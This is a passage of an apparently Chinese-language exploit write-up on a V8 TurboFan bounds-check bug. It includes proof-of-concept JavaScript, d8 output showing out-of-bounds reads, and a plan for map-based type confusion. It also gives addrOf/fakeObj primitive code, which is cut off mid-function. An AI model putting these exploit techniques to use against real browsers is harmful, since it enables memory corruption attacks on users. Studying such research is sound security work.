class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// output
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;undefined&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不幸的是，以上代码并没有造成越界访问并返回了undefined。&lt;/p&gt;&lt;p&gt;经过一些试验和调研，我们最终注意到LoadElement节点消失了。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2062&quot; data-rawheight=&quot;926&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2062&quot; data-original=&quot;https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2062&quot; data-rawheight=&quot;926&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2062&quot; data-original=&quot;https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-f75d4c568975ba90e280dba9bbd53b74_b.jpg&quot;/&gt;&lt;figcaption&gt;LoadElement节点在LoadElimination优化阶段后消失&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;最终我们发现idx变量被LoadElimination中的常数折叠直接去掉了。为了避免掉常数折叠，我们需要赋予CheckBound一个不确定的范围。&lt;/p&gt;&lt;p&gt;因此我们选择了在idx这个变量上进行一些算术操作。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

 &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// output
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.714350797546e-311&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;656&quot; data-rawheight=&quot;370&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;656&quot; data-original=&quot;https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;656&quot; data-rawheight=&quot;370&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;656&quot; data-original=&quot;https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-f032049790b75d9ed3c3aebbce50f11f_b.jpg&quot;/&gt;&lt;figcaption&gt;常数折叠已被避免&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;Cool! 我们可以从代码中观察到越界访问已经发生并把越界的读取的数据返回了! 从技术角度上来讲，我们现在完全可以使用这个技巧完成整个漏洞利用了。&lt;/p&gt;&lt;p&gt;但是，我个人还是更喜欢另外一种更有趣的方式: 逃逸分析&lt;/p&gt;&lt;h2&gt;逃逸分析&lt;/h2&gt;&lt;p&gt;逃逸分析这种优化可以用来移除临时分配的对象。&lt;/p&gt;&lt;p&gt;例如，在如下代码中，因为&amp;#34;o&amp;#34; 这个对象是非逃逸的，所以&amp;#34;o&amp;#34;这个对象会在逃逸分析中被直接删掉。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;c1&quot;&gt;// before escape analysis
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// after escape analysis
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;foo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为逃逸分析在LoadElimination和MachineOperatorReducer之间，所以我们可以把一个常数放在非逃逸对象中来避免常数折叠。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

 &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// output
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1.99567061273097e-310&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;到目前为止，现在我们已经成功把这个漏洞转换成了一个数组Off-By-One漏洞。&lt;/p&gt;&lt;h2&gt;利用数组Off-By-One漏洞&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1472&quot; data-rawheight=&quot;590&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1472&quot; data-original=&quot;https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1472&quot; data-rawheight=&quot;590&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1472&quot; data-original=&quot;https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-b9f64357944ae22d4c76f3470c5326e8_b.jpg&quot;/&gt;&lt;figcaption&gt;V8中的对象表示&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;在V8中，对象的类型由它的Map成员来确定。因此，如果我们能把一个double数组的map替换为一个var数组的map, 那么我们就能得到一个type confusion的数组。&lt;/p&gt;&lt;p&gt;因为Map是JS对象的第一个成员变量，通过对堆和对象的排布，我们可以把两个数组挤在一起，然后用前一个数组去读写后一个的Map成员。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1432&quot; data-rawheight=&quot;494&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1432&quot; data-original=&quot;https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1432&quot; data-rawheight=&quot;494&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1432&quot; data-original=&quot;https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-eb2f933d17b20958d0af8beb8800fd5d_b.jpg&quot;/&gt;&lt;figcaption&gt;利用Off-By-One来伪造对象的思路&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;现在的利用思路是: 构造出两个Off-By-One的数组，第一个用来信息泄露, 第二个用来伪造对象。上图展示了伪造对象的思路。&lt;/p&gt;&lt;h2&gt;堆风水&lt;/h2&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_b.jpg&quot; data-size=&quot;small&quot; data-rawwidth=&quot;602&quot; data-rawheight=&quot;554&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;602&quot; data-original=&quot;https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_b.jpg&quot; data-size=&quot;small&quot; data-rawwidth=&quot;602&quot; data-rawheight=&quot;554&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;602&quot; data-original=&quot;https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-d97c78f330ef715d3c1f6321f08716be_b.jpg&quot;/&gt;&lt;figcaption&gt;实际调试过程中观察到的对象结构&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;很不幸的是，在试验上述思路的过程中，我们注意到堆的布局非常奇怪。数组的backstore总之在数组头之前。这导致了我们只能通过Off-By-One来读自己的Map。&lt;/p&gt;&lt;p&gt;这其实对于泄露double数组的map没有影响。然而，我们无法泄露var数组的map。因为var数组读出的map是以object的形式呈现的，这没有办法让我们知道它的地址值。&lt;/p&gt;&lt;p&gt;万幸的是，V8是用一个独立的堆来管理Map对象的，内存的布局在这个堆里还是较为稳定的。因此，我们可以为double数组map的地址加上固定的偏移来获取var数组的map地址。&lt;/p&gt;&lt;h2&gt;构建稳定的漏洞利用原语&lt;/h2&gt;&lt;p&gt;一开始，我们使用如下样式的代码来做信息泄露和对象伪造。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lkrefs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leaker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;lkrefs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;double_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;leaker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;faker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;lkrefs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;var_array_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeObj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
